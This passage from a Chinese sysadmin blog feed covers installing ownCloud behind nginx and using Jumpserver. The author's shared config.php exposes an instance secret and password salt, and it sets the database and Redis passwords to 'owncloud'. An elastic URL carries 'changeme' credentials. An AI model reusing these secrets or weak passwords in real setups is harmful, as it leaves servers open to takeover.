MariaDB 或 Percona 命令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/mysqld (start|stop|restart|status)</span><br></pre></td></tr></table></figure><ul><li>php命令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/php-fpm (start|stop|restart|status)</span><br></pre></td></tr></table></figure><ul><li>nginx 命令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -s reload</span><br></pre></td></tr></table></figure><ul><li>Redis 命令（可选安装）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/redis-server (start|stop|restart|status)</span><br></pre></td></tr></table></figure><p><strong>网站根目录</strong></p><blockquote><p>默认的网站根目录： /data/www/default</p></blockquote><h1 id="安装owncloud"><a href="#安装owncloud" class="headerlink" title="安装owncloud"></a>安装owncloud</h1><p>1.下载项目并解压</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.owncloud.org/community/owncloud-10.0.10.tar.bz2</span><br><span class="line">tar xf owncloud-10.0.10.tar.bz2  &amp;&amp; cd owncloud &amp;&amp; rm -fr /data/www/default/* &amp;&amp; cp -ar * /data/www/default</span><br></pre></td></tr></table></figure><p>2.修改项目端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">$ vim /etc/nginx/conf.d/owncloud-officer.conf</span><br><span class="line">upstream php-handler &#123;</span><br><span class="line">    server 127.0.0.1:9000;</span><br><span class="line">    # Depending on your used PHP version</span><br><span class="line">    #server unix:/var/run/php5-fpm.sock;</span><br><span class="line">    #server unix:/var/run/php7-fpm.sock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 12312;</span><br><span class="line">    server_name cloud.example.com;</span><br><span class="line"></span><br><span class="line">    keepalive_timeout    70;</span><br><span class="line"></span><br><span class="line">    # Add headers to serve security related headers</span><br><span class="line">    # Before enabling Strict-Transport-Security headers please read into this topic first.</span><br><span class="line">    #add_header Strict-Transport-Security &quot;max-age=15552000; includeSubDomains&quot;;</span><br><span class="line">    add_header X-Content-Type-Options nosniff;</span><br><span class="line">    add_header X-Frame-Options &quot;SAMEORIGIN&quot;;</span><br><span class="line">    add_header X-XSS-Protection &quot;1; mode=block&quot;;</span><br><span class="line">    add_header X-Robots-Tag none;</span><br><span class="line">    add_header X-Download-Options noopen;</span><br><span class="line">    add_header X-Permitted-Cross-Domain-Policies none;</span><br><span class="line"></span><br><span class="line">    # Path to the root of your installation</span><br><span class="line">    root /data/www/default/;</span><br><span class="line"></span><br><span class="line">    location = /robots.txt &#123;</span><br><span class="line">        allow all;</span><br><span class="line">        log_not_found off;</span><br><span class="line">        access_log off;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # The following 2 rules are only needed for the user_webfinger app.</span><br><span class="line">    # Uncomment it if you&apos;re planning to use this app.</span><br><span class="line">    #rewrite ^/.well-known/host-meta /public.php?service=host-meta last;</span><br><span class="line">    #rewrite ^/.well-known/host-meta.json /public.php?service=host-meta-json last;</span><br><span class="line"></span><br><span class="line">    location = /.well-known/carddav &#123;</span><br><span class="line">        return 301 $scheme://$host/remote.php/dav;</span><br><span class="line">    &#125;</span><br><span class="line">    location = /.well-known/caldav &#123;</span><br><span class="line">        return 301 $scheme://$host/remote.php/dav;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # set max upload size</span><br><span class="line">    client_max_body_size 512M;</span><br><span class="line">    fastcgi_buffers 8 4K;                     # Please see note 1</span><br><span class="line">    fastcgi_ignore_headers X-Accel-Buffering; # Please see note 2</span><br><span class="line"></span><br><span class="line">    # Disable gzip to avoid the removal of the ETag header</span><br><span class="line">    # Enabling gzip would also make your server vulnerable to BREACH</span><br><span class="line">    # if no additional measures are done. See https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=773332</span><br><span class="line">    gzip off;</span><br><span class="line"></span><br><span class="line">    # Uncomment if your server is build with the ngx_pagespeed module</span><br><span class="line">    # This module is currently not supported.</span><br><span class="line">    #pagespeed off;</span><br><span class="line"></span><br><span class="line">    error_page 403 /core/templates/403.php;</span><br><span class="line">    error_page 404 /core/templates/404.php;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        rewrite ^ /index.php$uri;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ ^/(?:build|tests|config|lib|3rdparty|templates|data)/ &#123;</span><br><span class="line">        return 404;</span><br><span class="line">    &#125;</span><br><span class="line">    location ~ ^/(?:\.|autotest|occ|issue|indie|db_|console) &#123;</span><br><span class="line">        return 404;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ ^/(?:index|remote|public|cron|core/ajax/update|status|ocs/v[12]|updater/.+|ocs-provider/.+|core/templates/40[34])\.php(?:$|/) &#123;</span><br><span class="line">        fastcgi_split_path_info ^(.+\.php)(/.*)$;</span><br><span class="line">        include fastcgi_params;</span><br><span class="line">        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">        fastcgi_param SCRIPT_NAME $fastcgi_script_name; # necessary for owncloud to detect the contextroot https://github.com/owncloud/core/blob/v10.0.0/lib/private/AppFramework/Http/Request.php#L603</span><br><span class="line">        fastcgi_param PATH_INFO $fastcgi_path_info;</span><br><span class="line">        fastcgi_param modHeadersAvailable true; #Avoid sending the security headers twice</span><br><span class="line">        fastcgi_param front_controller_active true;</span><br><span class="line">        fastcgi_read_timeout 180; # increase default timeout e.g. for long running carddav/ caldav syncs with 1000+ entries</span><br><span class="line">        fastcgi_pass php-handler;</span><br><span class="line">        fastcgi_intercept_errors on;</span><br><span class="line">        fastcgi_request_buffering off; #Available since NGINX 1.7.11</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ ^/(?:updater|ocs-provider)(?:$|/) &#123;</span><br><span class="line">        try_files $uri $uri/ =404;</span><br><span class="line">        index index.php;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # Adding the cache control header for js and css files</span><br><span class="line">    # Make sure it is BELOW the PHP block</span><br><span class="line">    location ~ \.(?:css|js)$ &#123;</span><br><span class="line">        try_files $uri /index.php$uri$is_args$args;</span><br><span class="line">        add_header Cache-Control &quot;max-age=15778463&quot;;</span><br><span class="line">        # Add headers to serve security related headers (It is intended to have those duplicated to the ones above)</span><br><span class="line">        # Before enabling Strict-Transport-Security headers please read into this topic first.</span><br><span class="line">        #add_header Strict-Transport-Security &quot;max-age=15552000; includeSubDomains&quot;;</span><br><span class="line">        add_header X-Content-Type-Options nosniff;</span><br><span class="line">        add_header X-Frame-Options &quot;SAMEORIGIN&quot;;</span><br><span class="line">        add_header X-XSS-Protection &quot;1; mode=block&quot;;</span><br><span class="line">        add_header X-Robots-Tag none;</span><br><span class="line">        add_header X-Download-Options noopen;</span><br><span class="line">        add_header X-Permitted-Cross-Domain-Policies none;</span><br><span class="line">        # Optional: Don&apos;t log access to assets</span><br><span class="line">        access_log off;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ \.(?:svg|gif|png|html|ttf|woff|ico|jpg|jpeg|map)$ &#123;</span><br><span class="line">        add_header Cache-Control &quot;public, max-age=7200&quot;;</span><br><span class="line">        try_files $uri /index.php$uri$is_args$args;</span><br><span class="line">        # Optional: Don&apos;t log access to other assets</span><br><span class="line">        access_log off;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>服务器配置完成后，启动nginx，便可以在网页浏览器里面访问owncloud。输入ip和端口即可<br>一旦 URL 加载完毕，我们将呈现上述页面。这里，我们将创建管理员用户同时提供数据库信息。当所有信息提供完毕，点击“Finish setup”。<br>我们将被重定向到登录页面，在这里，我们需要输入先前创建的凭据：<br>一旦创建错误，可以删除<code>/data/www/default/config.php</code>文件，重新刷新页面，可以重新配置管理员。</p></blockquote><h3 id="这里提供我的一份配置"><a href="#这里提供我的一份配置" class="headerlink" title="这里提供我的一份配置"></a>这里提供我的一份配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$ cat ~/owncloud/config.php</span><br><span class="line">&lt;?php</span><br><span class="line">$CONFIG = array (</span><br><span class="line">  &apos;instanceid&apos; =&gt; &apos;oc9wp89saij8&apos;,</span><br><span class="line">  &apos;passwordsalt&apos; =&gt; &apos;2k4ULPneBUz7kUvz3wOH7uNpYwWiGx&apos;,</span><br><span class="line">  &apos;secret&apos; =&gt; &apos;97FrWKoVBzNIb3uir89QEEEnKt7IwG4B+Q+Ye2HlYrtda3OZ&apos;,</span><br><span class="line">  &apos;trusted_domains&apos; =&gt; </span><br><span class="line">  array (</span><br><span class="line">    0 =&gt; &apos;ip:port&apos;,  #自己的ip和端口</span><br><span class="line">  ),</span><br><span class="line">  &apos;datadirectory&apos; =&gt; &apos;/data/www/default/owncloud/data&apos;,</span><br><span class="line">  &apos;overwrite.cli.url&apos; =&gt; &apos;http://ip:port&apos;, #自己的ip和端口</span><br><span class="line">  &apos;dbtype&apos; =&gt; &apos;mysql&apos;,</span><br><span class="line">  &apos;version&apos; =&gt; &apos;10.0.10.4&apos;,</span><br><span class="line">  &apos;dbname&apos; =&gt; &apos;owncloud&apos;,</span><br><span class="line">  &apos;dbhost&apos; =&gt; &apos;localhost&apos;,</span><br><span class="line">  &apos;dbtableprefix&apos; =&gt; &apos;oc_&apos;,</span><br><span class="line">  &apos;mysql.utf8mb4&apos; =&gt; true,</span><br><span class="line">  &apos;dbuser&apos; =&gt; &apos;ocuser&apos;,</span><br><span class="line">  &apos;dbpassword&apos; =&gt; &apos;owncloud&apos;,</span><br><span class="line">  &apos;logtimezone&apos; =&gt; &apos;UTC&apos;,</span><br><span class="line">  &apos;installed&apos; =&gt; true,</span><br><span class="line">  &apos;files_external_allow_create_new_local&apos; =&gt; &apos;true&apos;,</span><br><span class="line">  &apos;accounts.enable_medial_search&apos; =&gt; true,</span><br><span class="line">  &apos;user.search_min_length&apos; =&gt; 2,</span><br><span class="line">  &apos;memcache.local&apos; =&gt; &apos;\\OC\\Memcache\\Redis&apos;,</span><br><span class="line">  &apos;redis&apos; =&gt; </span><br><span class="line">  array (</span><br><span class="line">    &apos;host&apos; =&gt; &apos;localhost&apos;,</span><br><span class="line">    &apos;port&apos; =&gt; 6379,</span><br><span class="line">    &apos;timeout&apos; =&gt; 0.0,</span><br><span class="line">    &apos;password&apos; =&gt; &apos;owncloud&apos;,</span><br><span class="line">  ),</span><br><span class="line">  &apos;memcache.locking&apos; =&gt; &apos;\\OC\\Memcache\\Redis&apos;,</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="APACHE报错学习"><a href="#APACHE报错学习" class="headerlink" title="APACHE报错学习"></a>APACHE报错学习</h2><p>1.如果你打开页面看到如下错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“PHP is apparently set up to strip inline doc blocks. This will make several core apps inaccessible.”这可能是由缓存/加速器造成的，例如 Zend OPcache 或 eAccelerator。打开你的打开php.ini文件，找到：[opcache]，设置为：opcache.enable=0 和 opcache.enable_cli=0。</span><br></pre></td></tr></table></figure><p>2.修改配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/local/php/etc/php.d/opcache.ini</span><br><span class="line"></span><br><span class="line">[opcache]</span><br><span class="line">zend_extension=/usr/local/php/ext/opcache.so</span><br><span class="line">opcache.enable=0</span><br><span class="line">opcache.memory_consumption=128</span><br><span class="line">opcache.interned_strings_buffer=8</span><br><span class="line">opcache.max_accelerated_files=4000</span><br><span class="line">opcache.revalidate_freq=60</span><br><span class="line">opcache.save_comments=0</span><br><span class="line">opcache.fast_shutdown=1</span><br><span class="line">opcache.enable_cli=0</span><br><span class="line">;opcache.optimization_level=0</span><br></pre></td></tr></table></figure><p>3.输入命令重启php</p><p>Apache 命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/httpd (start|stop|restart|status)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="owncloud" scheme="https://fenghong.tech/categories/owncloud/"/>
    
    
      <category term="Linux" scheme="https://fenghong.tech/tags/Linux/"/>
    
      <category term="owncloud-10.0.10.4" scheme="https://fenghong.tech/tags/owncloud-10-0-10-4/"/>
    
      <category term="php-7.2.11" scheme="https://fenghong.tech/tags/php-7-2-11/"/>
    
      <category term="mariadb-10.2.18" scheme="https://fenghong.tech/tags/mariadb-10-2-18/"/>
    
      <category term="nginx-1.15.5" scheme="https://fenghong.tech/tags/nginx-1-15-5/"/>
    
  </entry>
  
  <entry>
    <title>jumpserver架构</title>
    <link href="https://fenghong.tech/jpserver3.html"/>
    <id>https://fenghong.tech/jpserver3.html</id>
    <published>2018-09-08T01:59:32.000Z</published>
    <updated>2018-11-07T11:31:40.440Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="架构说明"><a href="#架构说明" class="headerlink" title="架构说明"></a>架构说明</h1><p><img src="images/tapd_23280401_base64_1537347696_26.png" alt="组件架构图"></p><h1 id="组件说明"><a href="#组件说明" class="headerlink" title="组件说明"></a>组件说明</h1><h2 id="Jumpserver"><a href="#Jumpserver" class="headerlink" title="Jumpserver"></a>Jumpserver</h2><p>现指 Jumpserver 管理后台，是核心组件（Core）, 使用 Django Class Based View 风格开发，支持 Restful API。</p><p><a href="https://github.com/jumpserver/jumpserver.git" target="_blank" rel="noopener">Github</a></p><h2 id="Coco"><a href="#Coco" class="headerlink" title="Coco"></a>Coco</h2><p>实现了 SSH Server 和 Web Terminal Server 的组件，提供 SSH 和 WebSocket 接口, 使用 Paramiko 和 Flask 开发。</p><p><a href="https://github.com/jumpserver/coco.git" target="_blank" rel="noopener">Github</a></p><h2 id="Luna"><a href="#Luna" class="headerlink" title="Luna"></a>Luna</h2><p>现在是 Web Terminal 前端，计划前端页面都由该项目提供，Jumpserver 只提供 API，不再负责后台渲染html等。</p><p><a href="https://github.com/jumpserver/luna.git" target="_blank" rel="noopener">Github</a></p><h1 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h1><p>luna 的页面不启动解决,2222未打开等问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f /data/opt/coco/keys/.access_key</span><br></pre></td></tr></table></figure><p>重启服务即可，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">登陆jumpserver，</span><br><span class="line">打开会话管理-----&gt;</span><br><span class="line">打开终端管理-----&gt;</span><br><span class="line">更新即可</span><br></pre></td></tr></table></figure><h1 id="用户资产"><a href="#用户资产" class="headerlink" title="用户资产"></a>用户资产</h1><h2 id="Web-连接资产"><a href="#Web-连接资产" class="headerlink" title="Web 连接资产"></a>Web 连接资产</h2><p>点击页面左边的 Web 终端：</p><p>[<img src="images/tapd_23280401_base64_1537337879_68.png" alt="图片描述"></p><p>打开资产所在的节点：</p><p>[<img src="images/tapd_23280401_base64_1537337733_20.png" alt="图片描述"></p><p>点击资产名字，就连上资产了，如果显示连接错误，请联系管理员解决</p><h2 id="SSH-连接资产"><a href="#SSH-连接资产" class="headerlink" title="SSH 连接资产"></a>SSH 连接资产</h2><p>咨询管理员 跳板机服务器地址 及 端口 ，使用 ssh 方式输入自己的用户名和密码登录（与Web登录的用户密码一致）</p><p>[<img src="images/tapd_23280401_base64_1537337623_63.png" alt="图片描述"></p><h2 id="SSH-主机登出"><a href="#SSH-主机登出" class="headerlink" title="SSH 主机登出"></a>SSH 主机登出</h2><p>推荐退出主机时使用 exit 命令或者 ctrl + d 退出会话</p><h2 id="SFTP-上传文件到-Linux-资产"><a href="#SFTP-上传文件到-Linux-资产" class="headerlink" title="SFTP 上传文件到 Linux 资产"></a>SFTP 上传文件到 Linux 资产</h2><p>咨询管理员 跳板机服务器地址 及 端口 ，使用 ssh 方式输入自己的用户名和密码登录（与 SSH 登录跳板机的用户密码一致）</p><p>连接成功后，可以看到当前拥有权限的资产，打开资产，然后选择系统用户，即可到资产的 /tmp 目录（/tmp 目录为管理员自定义）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="server" scheme="https://fenghong.tech/categories/server/"/>
    
    
      <category term="Linux" scheme="https://fenghong.tech/tags/Linux/"/>
    
      <category term="Jumpserver" scheme="https://fenghong.tech/tags/Jumpserver/"/>
    
      <category term="Coco" scheme="https://fenghong.tech/tags/Coco/"/>
    
      <category term="Luna" scheme="https://fenghong.tech/tags/Luna/"/>
    
      <category term="sftp" scheme="https://fenghong.tech/tags/sftp/"/>
    
  </entry>
  
  <entry>
    <title>jumpserver用户使用</title>
    <link href="https://fenghong.tech/jpserver2.html"/>
    <id>https://fenghong.tech/jpserver2.html</id>
    <published>2018-08-28T01:59:32.000Z</published>
    <updated>2018-11-07T11:31:40.440Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="用户页面"><a href="#用户页面" class="headerlink" title="用户页面"></a>用户页面</h1><p>通过管理员发送的邮件里面的 Jumpserver 地址登录进行用户初始化</p><p><img src="images/tapd_23280401_base64_1537346899_31.png" alt="图片描述"></p><h2 id="1-0-添加密码及MFA"><a href="#1-0-添加密码及MFA" class="headerlink" title="1.0 添加密码及MFA"></a>1.0 添加密码及MFA</h2><p>点击设置密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">要求10位数，必须有大写字母，其他无所谓</span><br></pre></td></tr></table></figure><p><img src="images/tapd_23280401_base64_1537346915_59.png" alt="图片描述"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">登录名为：您的英文名（全小写）。</span><br><span class="line">密码为：您刚设置的密码。</span><br></pre></td></tr></table></figure></p><p><img src="images/tapd_23280401_base64_1537346932_41.png" alt="图片描述"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">点击下一步---&gt;</span><br><span class="line">跳过google应用---&gt;</span><br><span class="line">点击下一步----&gt;</span><br></pre></td></tr></table></figure><p><img src="images/tapd_23280401_base64_1537346943_80.png" alt="图片描述"></p><ul><li>MFA</li></ul><p>到达上图所示界面时，即开始验证MFA，建议使用阿里云的MFA，不要使用google的,所以跳过了这个过程，下面这个是阿里云网址截图的app。</p><p><img src="images/tapd_23280401_base64_1537346966_26.png" alt="图片描述"></p><p>下载阿里云app完毕后，进入app界面（建议不要卸载）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">点击----&gt;&gt;</span><br><span class="line">控制台-----&gt;&gt;</span><br><span class="line">虚拟MFA-----&gt;&gt;</span><br><span class="line">点击右上角+，扫描添加MFA，绑定成功返回登录,登录成功后填写个人信息。</span><br></pre></td></tr></table></figure><h2 id="1-1-查看个人信息"><a href="#1-1-查看个人信息" class="headerlink" title="1.1 查看个人信息"></a>1.1 查看个人信息</h2><p>个人信息页面展示了用户的名称、角色、邮件、所属用户组、SSh 公钥、创建日期、最后登录日期和失效日期等信息：</p><p><img src="images/tapd_23280401_base64_1537337395_70.png" alt="图片描述"></p><h2 id="1-2-修改密码"><a href="#1-2-修改密码" class="headerlink" title="1.2 修改密码"></a>1.2 修改密码</h2><p>在个人信息页面点击”更改密码”按钮，跳转到修改密码页面，正确输入新旧密码，即可完成密码修改:</p><p><img src="images/tapd_23280401_base64_1537337414_83.png" alt="图片描述"></p><h2 id="1-3-设置或禁用-MFA"><a href="#1-3-设置或禁用-MFA" class="headerlink" title="1.3 设置或禁用 MFA"></a>1.3 设置或禁用 MFA</h2><p>在个人信息页面点击”设置MFA”按钮（设置完成后按钮会禁用MFA），根据提示处理即可，MFA全称是Multi-Factor Authentication，遵循（TOTP）标准（RFC 6238）</p><h2 id="1-4-修改-SSH-公钥"><a href="#1-4-修改-SSH-公钥" class="headerlink" title="1.4 修改 SSH 公钥"></a>1.4 修改 SSH 公钥</h2><p>点击”重置 SSH 密钥”按钮，跳转到修改 SSH 密钥信息页，复制 SSH 密钥信息到指定框中，即可完成 SSH 密钥修改：</p><p>查看 SSH 公钥信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat ~/.ssh/id_rsa.pub</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDadDXxxx......</span><br></pre></td></tr></table></figure><p><img src="images/tapd_23280401_base64_1537337436_46.png" alt="图片描述"></p><h2 id="1-5-查看个人资产"><a href="#1-5-查看个人资产" class="headerlink" title="1.5 查看个人资产"></a>1.5 查看个人资产</h2><p>自己被授权的资产，增减授权资产的需求请联系管理员</p><p><img src="images/tapd_23280401_base64_1537337460_35.png" alt="图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="server" scheme="https://fenghong.tech/categories/server/"/>
    
    
      <category term="Linux" scheme="https://fenghong.tech/tags/Linux/"/>
    
      <category term="Jumpserver" scheme="https://fenghong.tech/tags/Jumpserver/"/>
    
      <category term="MFA" scheme="https://fenghong.tech/tags/MFA/"/>
    
  </entry>
  
  <entry>
    <title>jumpserver管理者使用</title>
    <link href="https://fenghong.tech/jpserver01.html"/>
    <id>https://fenghong.tech/jpserver01.html</id>
    <published>2018-08-19T01:59:32.000Z</published>
    <updated>2018-11-07T11:31:40.440Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h1><h2 id="必备条件"><a href="#必备条件" class="headerlink" title="必备条件"></a>必备条件</h2><ul><li>一台安装好 Jumpserver 系统的可用主机（堡垒机）</li><li>一台或多台可用的 Linux、Windows资产设备（被管理的资产）</li></ul><h2 id="一、系统设置"><a href="#一、系统设置" class="headerlink" title="一、系统设置"></a>一、系统设置</h2><p>1.1 基本设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 修改 URL 的 localhost 为你的实际 url 地址，否则邮件收到的地址将为 localhost</span><br><span class="line">修改完 url 地址后需要重启 jumpserver 服务（重启才能生效，后续会解决这个问题）</span><br></pre></td></tr></table></figure><p>1.2 邮件设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 点击页面上边的&quot;邮件设置&quot; TAB ，进入邮件设置页面</span><br><span class="line"># 配置邮件服务后，点击页面的&quot;测试连接&quot;按钮，如果配置正确，Jumpserver 会发送一条测试邮件到</span><br><span class="line">您的 SMTP 账号邮箱里面，确定收到测试邮件后点击保存即可使用。</span><br></pre></td></tr></table></figure><p>1.3 LDAP设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 如果不需要使用 ldap 登陆 jumpserver，可以直接跳过，不需要设置</span><br><span class="line"># 先测试通过才能保存</span><br><span class="line"># DN 和 OU 一定要完整(如DN:cn=Manage,ou=Jumpserver,dc=jumpserver,ou=org)</span><br><span class="line">注：可借用第三方 gui 工具查看 ldap 用户的属性，新版本已经支持中文名登录，即cn=中文也可正常使用</span><br></pre></td></tr></table></figure><p>1.4 终端设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 命令记录保存到 elastic</span><br><span class="line">&#123;&quot;default&quot;: &#123;&quot;TYPE&quot;:&quot;server&quot;&#125;, &quot;ali-es&quot;: &#123;&quot;TYPE&quot;: &quot;elasticsearch&quot;, &quot;HOSTS&quot;: [&quot;http://elastic:changeme@localhost:9200&quot;]&#125;&#125;</span><br><span class="line"></span><br><span class="line"># 录像存储在 oss，Jumpserver 系统设置-终端设置 录像存储</span><br><span class="line">&#123;&quot;default&quot;: 